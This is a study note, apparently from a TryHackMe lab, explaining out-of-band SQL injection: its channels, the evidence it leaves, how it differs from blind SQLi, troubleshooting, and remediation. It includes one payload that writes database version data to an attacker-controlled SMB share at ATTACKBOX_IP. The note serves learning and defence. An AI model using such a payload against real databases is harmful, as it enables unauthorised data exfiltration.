# Out-of-Band SQL Injection

## What OOB means

OOB means **Out-of-Band**.

Out-of-band SQL Injection is a SQLi technique where the result or evidence does not come back through the normal web response.

Instead, the database or backend communicates through a separate channel.

## Mental model

```text
Normal SQLi:
request -> application -> database -> result in web response

OOB SQLi:
request -> application -> database
                         -> external DNS/HTTP/SMB interaction
```

## Common OOB channels

- DNS
- HTTP
- SMB / network share

## Evidence

Evidence for OOB SQLi can include:

- DNS callback,
- HTTP callback,
- Burp Collaborator / OAST interaction,
- file written to an external SMB share,
- external request made by the database/backend.

## Difference from blind SQLi

Blind SQLi observes application behaviour or response time.

OOB SQLi observes an external interaction.

```text
Blind SQLi -> response behaviour/time
OOB SQLi   -> external callback/file/request
```

## THM lab concept

A lab example used a stacked query to write database information to an external SMB share:

```sql
SELECT @@version INTO OUTFILE '\\ATTACKBOX_IP\logs\out.txt';
```

This is a lab example of causing the database to write data outside the normal HTTP response.

## Important MySQL/MariaDB note

`secure_file_priv` can restrict where MySQL/MariaDB can write files using `INTO OUTFILE`.

This means a payload may be correct, but the environment can still block the OOB technique.

## If no callback appears

No callback does not automatically prove OOB SQLi is impossible.

It may mean:

- wrong database syntax,
- stacked queries not supported,
- DB user lacks permissions,
- outbound DNS/HTTP/SMB blocked,
- `secure_file_priv` blocks file writes,
- listener or AttackBox problem,
- payload encoding issue,
- firewall or network segmentation.

Correct conclusion:

```text
No OOB evidence was observed for this specific attempt.
```

Not:

```text
OOB SQLi is impossible.
```

## Remediation

- Use prepared statements / parameterized queries.
- Use least-privilege database users.
- Disable risky database features where not needed.
- Restrict outbound traffic from database/backend systems.
- Monitor unusual DNS/HTTP/SMB egress.
